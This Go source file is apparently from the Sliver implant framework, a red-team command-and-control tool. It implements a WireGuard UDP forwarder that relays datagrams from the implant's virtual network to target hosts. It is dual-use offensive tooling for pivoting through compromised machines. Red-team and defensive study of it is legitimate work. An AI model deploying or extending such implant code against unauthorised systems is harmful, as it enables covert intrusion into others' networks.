package forwarder

/*
	Sliver Implant Framework
	Copyright (C) 2022  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.IncludeWG}}
import (
	"fmt"
	// {{if .Config.Debug}}
	"log"
	// {{end}}
	"net"
	"sync"
	"time"

	"github.com/bishopfox/sliver/implant/sliver/netstack"
	"gvisor.dev/gvisor/pkg/tcpip/adapters/gonet"
)

const (
	// wgUDPDatagramMaxLen is the largest datagram the forwarder
	// relays; larger datagrams are dropped.
	wgUDPDatagramMaxLen = 2048

	// wgUDPFlowIdleTimeout is how long a flow survives without
	// traffic before its upstream socket is closed. It also bounds
	// how long the forwarder waits for a target's reply.
	wgUDPFlowIdleTimeout = 60 * time.Second
)

// WGUDPForwarder - A WireGuard UDP forwarder. It listens for UDP
// datagrams on the tun and relays each one to the target over a real
// UDP socket, keeping one upstream socket per tun-side flow so
// replies find their way back to the right sender.
type WGUDPForwarder struct {
	ID            int
	tunIP         string
	tunPort       int
	targetAddress string
	tnet          *netstack.Net
	done          chan bool
	wg            sync.WaitGroup
	listener      *gonet.UDPConn
	mu            sync.Mutex
	stopOnce      sync.Once
}

// wgUDPFlowKey - Identifies one tun-side flow by its source address
// and port (named type; see template constraints).
type wgUDPFlowKey struct {
	srcIP   string
	srcPort int
}

// wgUDPFlow - One upstream socket for one tun-side sender. The
// upstream socket is a connected UDP socket, so replies from the
// target read back on it and are written back to the tun sender.
type wgUDPFlow struct {
	key    wgUDPFlowKey
	socket *net.UDPConn
}

// NewWGUDPForwarder - Create a new WireGuard UDP forwarder
func NewWGUDPForwarder(targetAddress string, tunIP string, tunPort int, tnet *netstack.Net) *WGUDPForwarder {
	uf := &WGUDPForwarder{
		tunIP:         tunIP,
		tunPort:       tunPort,
		targetAddress: targetAddress,
		tnet:          tnet,
		done:          make(chan bool),
		ID:            nextForwarderID(),
	}
	// Count Start so Stop waits for it even if Stop runs first.
	uf.wg.Add(1)
	udpForwarders[uf.ID] = uf
	return uf
}

// LocalAddr - The local address
func (f *WGUDPForwarder) LocalAddr() string {
	return fmt.Sprintf("%s:%d", f.tunIP, f.tunPort)
}

// RemoteAddr - The remote address
func (f *WGUDPForwarder) RemoteAddr() string {
	return f.targetAddress
}

// Start - Start the forwarder. It reads datagrams from the tun and
// relays each one upstream, returning replies to the tun sender,
// until Stop is called or the listener fails.
func (f *WGUDPForwarder) Start() error {
	defer f.wg.Done()
	listener, err := f.tnet.ListenUDP(&net.UDPAddr{IP: net.ParseIP(f.tunIP), Port: f.tunPort})
	if err != nil {
		return err
	}
	f.mu.Lock()
	f.listener = listener
	f.mu.Unlock()
	defer f.closeListener()
	select {
	case <-f.done:
		return nil
	default:
	}

	target, err := net.ResolveUDPAddr("udp", f.targetAddress)
	if err != nil {
		return err
	}

	flows := newWGUDPFlowTable()
	defer flows.closeAll()

	for {
		select {
		case <-f.done:
			return nil
		default:
			buf := make([]byte, wgUDPDatagramMaxLen)
			listener.SetReadDeadline(time.Now().Add(wgUDPFlowIdleTimeout))
			n, from, err := listener.ReadFrom(buf)
			if err != nil {
				if isWGUDPTemporaryReadError(err) {
					continue
				}
				select {
				case <-f.done:
					return nil
				default:
					return err
				}
			}
			if from == nil || n == 0 || n > wgUDPDatagramMaxLen {
				continue
			}
			flow := flows.get(wgUDPFlowKey{srcIP: from.String(), srcPort: portOf(from)}, target)
			if flow == nil {
				continue
			}
			payload := make([]byte, n)
			copy(payload, buf[:n])
			f.wg.Add(1)
			go func(flow *wgUDPFlow, from net.Addr, payload []byte) {
				defer f.wg.Done()
				relayWGUDPDatagram(flow, listener, from, payload)
			}(flow, from, payload)
		}
	}
}

// portOf - The port of a tun-side datagram's source address.
func portOf(addr net.Addr) int {
	if udpAddr, ok := addr.(*net.UDPAddr); ok {
		return udpAddr.Port
	}
	return 0
}

// isWGUDPTemporaryReadError - Deadline ticks on the tun listener are
// how an idle forwarder notices Stop, so timeouts are not fatal.
func isWGUDPTemporaryReadError(err error) bool {
	if netErr, ok := err.(net.Error); ok {
		return netErr.Timeout()
	}
	return false
}

// relayWGUDPDatagram - Send one datagram upstream on the flow's
// socket, then wait (bounded) for the target's reply and write it
// back to the tun sender. The synchronous exchange keeps per-flow
// ordering; the reply wait doubles as the flow's idle window.
func relayWGUDPDatagram(flow *wgUDPFlow, tun *gonet.UDPConn, from net.Addr, payload []byte) {
	flow.socket.SetWriteDeadline(time.Now().Add(wgUDPFlowIdleTimeout))
	if _, err := flow.socket.Write(payload); err != nil {
		// {{if .Config.Debug}}
		log.Printf("udp forwarder: upstream write failed: %v", err)
		// {{end}}
		return
	}
	reply := make([]byte, wgUDPDatagramMaxLen)
	flow.socket.SetReadDeadline(time.Now().Add(wgUDPFlowIdleTimeout))
	n, err := flow.socket.Read(reply)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("udp forwarder: upstream read failed: %v", err)
		// {{end}}
		return
	}
	tun.SetWriteDeadline(time.Now().Add(wgUDPFlowIdleTimeout))
	if _, err := tun.WriteTo(reply[:n], from); err != nil {
		// {{if .Config.Debug}}
		log.Printf("udp forwarder: tun write failed: %v", err)
		// {{end}}
	}
}

// Stop - Stop the forwarder
func (f *WGUDPForwarder) Stop() {
	f.stopOnce.Do(func() {
		close(f.done)
	})
	f.closeListener()
	f.wg.Wait()
}

func (f *WGUDPForwarder) closeListener() {
	f.mu.Lock()
	listener := f.listener
	f.listener = nil
	f.mu.Unlock()
	if listener != nil {
		listener.Close()
	}
}

// wgUDPFlowTable - Tracks the flows seen on the tun side, expiring
// idle ones and closing their upstream sockets.
type wgUDPFlowTable struct {
	mu    sync.Mutex
	flows map[wgUDPFlowKey]*wgUDPFlow
	seen  map[wgUDPFlowKey]time.Time
}

func newWGUDPFlowTable() *wgUDPFlowTable {
	return &wgUDPFlowTable{
		flows: make(map[wgUDPFlowKey]*wgUDPFlow),
		seen:  make(map[wgUDPFlowKey]time.Time),
	}
}

// get - Return the flow for a tun-side sender, dialing a fresh
// upstream socket if none exists yet. Idle flows older than the
// timeout are closed first.
func (t *wgUDPFlowTable) get(key wgUDPFlowKey, target *net.UDPAddr) *wgUDPFlow {
	t.mu.Lock()
	defer t.mu.Unlock()
	t.closeIdleFlowsLocked()
	if flow, ok := t.flows[key]; ok {
		t.seen[key] = time.Now()
		return flow
	}
	local, err := net.ResolveUDPAddr("udp", "0.0.0.0:0")
	if err != nil {
		return nil
	}
	socket, err := net.DialUDP("udp", local, target)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("udp forwarder: upstream dial failed: %v", err)
		// {{end}}
		return nil
	}
	flow := &wgUDPFlow{key: key, socket: socket}
	t.flows[key] = flow
	t.seen[key] = time.Now()
	return flow
}

// closeIdleFlows - Close upstream sockets that have seen no traffic
// within the idle timeout.
func (t *wgUDPFlowTable) closeIdleFlowsLocked() {
	for key, seen := range t.seen {
		if time.Since(seen) > wgUDPFlowIdleTimeout {
			if flow, ok := t.flows[key]; ok {
				flow.socket.Close()
				delete(t.flows, key)
			}
			delete(t.seen, key)
		}
	}
}

func (t *wgUDPFlowTable) closeAll() {
	t.mu.Lock()
	defer t.mu.Unlock()
	for key, flow := range t.flows {
		flow.socket.Close()
		delete(t.flows, key)
		delete(t.seen, key)
	}
}

// {{end}}
